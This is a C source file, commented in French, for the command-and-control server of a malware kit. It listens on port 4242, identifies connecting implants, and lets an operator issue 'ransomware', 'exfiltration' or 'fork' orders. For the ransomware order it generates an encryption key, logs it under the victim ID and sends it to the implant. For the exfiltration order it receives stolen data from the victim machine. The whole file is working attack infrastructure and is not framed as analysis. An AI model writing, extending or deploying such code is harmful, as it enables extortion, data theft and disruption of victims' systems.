#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PORT 4242
#define BACKLOG 10
#define CLIENT_ID "7aB9X3rL" // Identifiant du client
#define KEY_SIZE 16
#define BUFFER_SIZE 1024

// Générer une clé aléatoire
void generate_key(char *key) {
    for (int i = 0; i < KEY_SIZE; i++) {
        key[i] = rand() % 256;
    }
}

// Journaliser la clé et l'ID client
void log_key_to_file(const char *key, const char *client_id) {
    FILE *logfile = fopen("key_log.txt", "a");
    if (!logfile) {
        perror("Erreur d'ouverture du fichier de log");
        return;
    }

    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    fprintf(logfile, "Date: %04d-%02d-%02d %02d:%02d:%02d | Client ID: %s\n",
            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
            tm.tm_hour, tm.tm_min, tm.tm_sec, client_id);

    fprintf(logfile, "Cle (ASCII): ");
    for (int i = 0; i < KEY_SIZE; i++) {
        fprintf(logfile, "%c", key[i]);
    }
    fprintf(logfile, "\nCle (Hexa): ");
    for (int i = 0; i < KEY_SIZE; i++) {
        fprintf(logfile, "%02x", (unsigned char)key[i]);
    }
    fprintf(logfile, "\n\n");

    fclose(logfile);
}

// Envoi de la clé au client
void send_key_to_client(int client_fd, const char *key) {
    if (send(client_fd, key, KEY_SIZE, 0) != KEY_SIZE) {
        perror("send");
    } else {
        printf("Cle envoyée au client.\n");
    }
}

// Gérer l'ordre exfiltration
void exfiltration(int client_fd) {
    char buffer[BUFFER_SIZE];
    int bytes_read;

    printf("Ordre 'exfiltration' envoyé au client.\n");

    bytes_read = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        printf("Données exfiltrées reçues du client :\n%s\n", buffer);
    } else {
        printf("Erreur ou aucune donnée reçue pour l'exfiltration.\n");
    }
}

int main() {
    struct sockaddr_in sa, client_addr;
    int socket_fd, client_fd;
    char buffer[BUFFER_SIZE];
    int bytes_read;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(PORT);

    socket_fd = socket(sa.sin_family, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        perror("socket");
        return 1;
    }

    if (bind(socket_fd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        perror("bind");
        close(socket_fd);
        return 2;
    }

    if (listen(socket_fd, BACKLOG) != 0) {
        perror("listen");
        close(socket_fd);
        return 3;
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    while (1) {
        socklen_t addr_size = sizeof(client_addr);
        client_fd = accept(socket_fd, (struct sockaddr*)&client_addr, &addr_size);
        if (client_fd == -1) {
            perror("accept");
            continue;
        }

        bytes_read = recv(client_fd, buffer, sizeof(buffer), 0);
        if (bytes_read < 0) {
            perror("recv");
            close(client_fd);
            continue;
        }
        buffer[bytes_read] = '\0';
        printf("Identifiant du client reçu : %s\n", buffer);

        printf("Entrez un ordre à envoyer au client ('ransomware', 'exfiltration', ou 'fork'): ");
        char order[BUFFER_SIZE];
        fgets(order, sizeof(order), stdin);
        order[strcspn(order, "\n")] = 0;

        if (strcmp(order, "ransomware") == 0) {
            char key[KEY_SIZE];
            generate_key(key);
            log_key_to_file(key, buffer);
            send_key_to_client(client_fd, key);
        } else if (strcmp(order, "exfiltration") == 0) {
            send(client_fd, "exfiltration", strlen("exfiltration"), 0);
            exfiltration(client_fd);
        } else if (strcmp(order, "fork") == 0) {
            send(client_fd, "fork", strlen("fork"), 0);
            printf("Ordre 'fork' envoyé au client.\n");
        }

        close(client_fd);
    }

    close(socket_fd);
    return 0;
}
